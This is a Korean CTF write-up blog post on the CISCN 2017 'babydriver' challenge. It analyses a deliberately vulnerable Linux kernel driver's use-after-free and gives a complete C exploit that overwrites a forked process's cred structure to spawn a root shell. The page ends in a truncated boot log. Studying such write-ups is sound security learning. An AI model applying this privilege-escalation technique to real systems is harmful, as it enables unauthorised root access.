@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl">
+  
+  
+  
+  
+  <title>CISCN 2017 - Babydriver | 귀찮다</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="linux kernel uaf">
+<meta name="keywords" content="pwnable">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN 2017 - Babydriver">
+<meta property="og:url" content="https://blog.haklog.xyz/2019/11/01/kernelheap/index.html">
+<meta property="og:site_name" content="귀찮다">
+<meta property="og:description" content="linux kernel uaf">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-11-02T02:26:06.970Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CISCN 2017 - Babydriver">
+<meta name="twitter:description" content="linux kernel uaf">
+  
+  
+    <link rel="icon" href="/img/one.png">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/tanya.jpg" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">K4el</a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="검색" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>메뉴</li>
+                        <li>태그</li>
+                        
+                        
+                        <li>소개</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/categories/pwnable/">시스템 해킹(pwnable)</a></li>
+                        
+                            <li><a  href="/categories/web/">웹 해킹</a></li>
+                        
+                            <li><a  href="/categories/reversing/">리버싱</a></li>
+                        
+                            <li><a  href="/categories/wargame">wargame</a></li>
+                        
+                            <li><a  href="/categories/ctf/">CTF write up</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="https://github.com/NoELIEKT/" title="github">github</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Ctf/" style="font-size: 10px;">Ctf</a> <a href="/tags/ctf-pwnable/" style="font-size: 15px;">ctf, pwnable</a> <a href="/tags/ctf-pwnable-kernel/" style="font-size: 10px;">ctf, pwnable, kernel</a> <a href="/tags/pwanble-ctf/" style="font-size: 10px;">pwanble, ctf</a> <a href="/tags/pwnable/" style="font-size: 20px;">pwnable</a> <a href="/tags/pwnable-ctf/" style="font-size: 10px;">pwnable, ctf</a> <a href="/tags/pwnable-ctf-heap-fake-chunk/" style="font-size: 10px;">pwnable, ctf, heap, fake_chunk</a> <a href="/tags/pwnable-kernel/" style="font-size: 10px;">pwnable, kernel</a> <a href="/tags/pwnable-tool/" style="font-size: 10px;">pwnable, tool</a>
+                    </div>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">귀차니즘 환자 fnfnfn121@gmail.com</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="HOME">K4el</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/tanya.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="HOME">K4el</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/categories/pwnable/">시스템 해킹(pwnable)</a></li>
+                
+                    <li><a href="/categories/web/">웹 해킹</a></li>
+                
+                    <li><a href="/categories/reversing/">리버싱</a></li>
+                
+                    <li><a href="/categories/wargame">wargame</a></li>
+                
+                    <li><a href="/categories/ctf/">CTF write up</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/NoELIEKT/" title="github">github</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-kernelheap" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2019/11/01/kernelheap/" class="article-date">
+      <time datetime="2019-11-01T13:46:46.000Z" itemprop="datePublished">2019-11-01</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CISCN 2017 - Babydriver
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/pwanble/">pwanble</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable/">pwnable</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>linux kernel uaf</p>
+<a id="more"></a>
+
+
+<h2 id="KERNEL-HEAP-ALLOCATION"><a href="#KERNEL-HEAP-ALLOCATION" class="headerlink" title="KERNEL HEAP ALLOCATION"></a>KERNEL HEAP ALLOCATION</h2><p>커널에서 힙은 통상 프로그램과 유사하게 관리된다.<br>할당은 kmalloc, 해제는 kfree()를 통해 이루어지게된다.</p>
+<p>kmalloc을 살펴보면</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>인자로 size와 flags를 받아 할당을 진행한다. flags로 할당 방식을 정해줄 수 있다. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> * objp)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>할당된 힙 포인터를 매개변수로써 전달해주면 해당 포인터를 free하는 함수이다.</p>
+<h2 id="ANALYZE"><a href="#ANALYZE" class="headerlink" title="ANALYZE"></a>ANALYZE</h2><ul>
+<li>babydriver_init </li>
+</ul>
+<p><code> alloc_chrdev_region </code> 을 통해 디바이스를 할당하고, struct file_operation 구조체에 통신을 위한 함수 포인터를 작성하고 등록하는걸 볼 수 있다. </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">babydriver_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0L</span>L, <span class="number">1L</span>L, <span class="string">"babydev"</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (class *)_class_create(&amp;_this_module, <span class="string">"babydev"</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0L</span>L, babydev_no, <span class="number">0L</span>L, <span class="string">"babydev"</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>이 구조체에서 사용되지 않는 필드는 0으로 초기화된다</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">chardev_fops</span> = &#123;</span></span><br><span class="line">    .release = babyrelease,</span><br><span class="line">    .open    = babyopen,</span><br><span class="line">    .write = babywrite,</span><br><span class="line">    .read = babyread,</span><br><span class="line">    .ioctl = babyioctl,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>babyopen</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64L</span>L);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line">  printk(<span class="string">"device open\n"</span>);</span><br><span class="line">  retur <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>디바이스가 open될때 호출되는 함수이다.</p>
+<p> babydev_struct에 할당 정보를 저장한다.</p>
+<ul>
+<li>babywrite</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>디바이스에 데이터를 전송할때 호출되는 함수이다. </p>
+<p>babydev_struct가 비어있다면 -1을 리턴하며, 구조체에 등록된 buf_len보다 유저가 입력한 데이터의 길이가 더 작을경우 copy_from_user()를 통해 데이터를 받아낸다.</p>
+<ul>
+<li>babyread</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>babywrite와 반대로 동작하는 함수이다. 커널에서 유저 영역으로 데이터를 받아온다.</p>
+<ul>
+<li>babyioctl</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">"alloc done\n"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    result = <span class="number">-22L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>만약 command가 0x10001이라면 해제 후 원하는 size로 새롭게 할당한다.</p>
+<ul>
+<li>babyrelease</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">"device release\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>디바이스가 닫힐때 호출되는 함수다. device_buf를 kfree()로 해제한다. 여기서 uaf가 발생한다. 구조체에 있는 힘 포인터를 초기화 하지 않기 때문이다.</p>
+<p>처음에 디바이스가 해제될때 호출되는 함수라고 착각해서 어떻게 익스할지 고민을 많이 했었다. 디바이스가 닫힌다는건 단순히 유저 인터페이스와의 연결이 끊기는 것이므로 이는 옳지 않았다. </p>
+<h2 id="LINUX-KERNEL-UAF"><a href="#LINUX-KERNEL-UAF" class="headerlink" title="LINUX KERNEL UAF"></a>LINUX KERNEL UAF</h2><p>앞서 코드에서 uaf 취약점을 확인했는데, 이것을 어떻게 이용할 수 있을까? </p>
+<p>바로 heap에 cred 구조체가 할당된다는 사실을 이용하면 된다. fork()함수를 호출하면 새로 cred 구조체가 힙에 할당이 되는데, 이때 이 구조체의 크디는 168이다. ioctl을 이용하여<br>원하는 사이즈로 힙을 할당할 수 있으므로 168을 할당후 close()함으로써 해제시키면 된다. 두개를 동시에 열어야 하는데, 한개로 열었다 닫았다 하면 struct_buf에 존재하는 힙 포인터가 바뀌기 때문이다. </p>
+<p>cred 구조체에 값을 쓸 수 있으므로 앞서 공부했듯 모두 0으로 덮어버리면 자격 증명을 root로 바꿔버릴 수 있고, root shell을 딸 수 있게 된다.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span> payload[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">168</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fork() error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        write(fd2, payload, <span class="number">30</span>);</span><br><span class="line">        <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[*] YOU ARE ROOT"</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">[    3.871714] ata2.00: configured for MWDMA2</span><br><span class="line">[    3.877283] ledtrig-cpu: registered to indicate activity on CPUs</span><br><span class="line">[    3.887659] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5</span><br><span class="line">[    3.901527] NET: Registered protocol family 10</span><br><span class="line">[    3.912534] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray</span><br><span class="line">[    3.922893] cdrom: Uniform CD-ROM driver Revision: 3.20</span><br><span class="line">[    3.930857] NET: Registered protocol family 17</span><br><span class="line">[    3.937074] Key type dns_resolver registered</span><br><span class="line">[    3.947863] sr 1:0:0:0: Attached scsi generic sg0 type 5</span><br><span class="line">[    3.960228] microcode: CPU0 sig=0xf61, pf=0x1, revision=0x1</span><br><span class="line">[    3.968797] microcode: Microcode Update Driver: v2.01 &lt;tigran@aivazian.fsnet.co.uk&gt;, Peter Oruba</span><br><span class="line">[    3.981064] registered taskstats version 1</span><br><span class="line">[    3.987376] Loading compiled-in X.509 certificates</span><br><span class="line">[    3.996764] Loaded X.509 cert &apos;Build time autogenerated kernel key: bacd82d239214df43588d9d92466da88ef29ce76&apos;</span><br><span class="line">[    4.009378] zswap: loaded using pool lzo/zbud</span><br><span class="line">[    4.018115] Key type trusted registered</span><br><span class="line">[    4.038141] Key type encrypted registered</span><br><span class="line">[    4.044146] AppArmor: AppArmor sha1 policy hashing enabled</span><br><span class="line">[    4.052365] ima: No TPM chip found, activating TPM-bypass!</span><br><span class="line">[    4.060038] evm: HMAC attrs: 0x1</span><br><span class="line">[    4.064695]   Magic number: 11:453:105</span><br><span class="line">[    4.070885] rtc_cmos 00:00: setting system clock to 2019-11-02 02:06:52 UTC (1572660412)</span><br><span class="line">[    4.081697] BIOS EDD facility v0.16 2004-Jun-25, 0 devices found</span><br><span class="line">[    4.088535] EDD information not available.</span><br><span class="line">[    4.099240] Freeing unused kernel memory: 1464K (ffffffff81f41000 - ffffffff820af000)</span><br><span class="line">[    4.110323] Write protecting the kernel read-only data: 14336k</span><br><span class="line">[    4.127652] Freeing unused kernel memory: 1916K (ffff880001821000 - ffff880001a00000)</span><br><span class="line">[    4.136520] Freeing unused kernel memory: 120K (ffff880001de2000 - ffff880001e00000)</span><br><span class="line">chown: flag: No such file 